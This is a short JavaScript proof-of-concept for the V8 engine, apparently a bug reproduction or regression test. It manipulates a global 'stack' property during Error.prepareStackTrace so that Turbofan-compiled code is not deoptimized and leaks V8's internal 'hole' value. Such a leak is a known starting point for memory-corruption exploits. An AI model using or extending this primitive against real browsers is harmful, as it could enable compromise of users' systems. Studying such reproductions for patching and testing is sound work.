// flags: --allow-natives-syntax

function f() { return stack; }

Error.prepareStackTrace = () => {
    // delete accessor and redefine as normal property
    // because accessor is not handled by JSNativeContextSpecialization::ReduceGlobalAccess()
    delete stack;
    Object.defineProperty(globalThis, "stack", { value: 1, writable: true }); // configurable is false (default)
    stack = {}; // cell_type == kMutable

    for (let i = 0; i < 0x10000; i++) { f(); } // compile via turbofan => code dependency is not installed
}

Error.captureStackTrace(globalThis);
Object.defineProperty(globalThis, "stack", { value: 1, configurable: true });

delete stack;
const hole = f(); // not deoptimized => leak hole

% DebugPrint(hole);
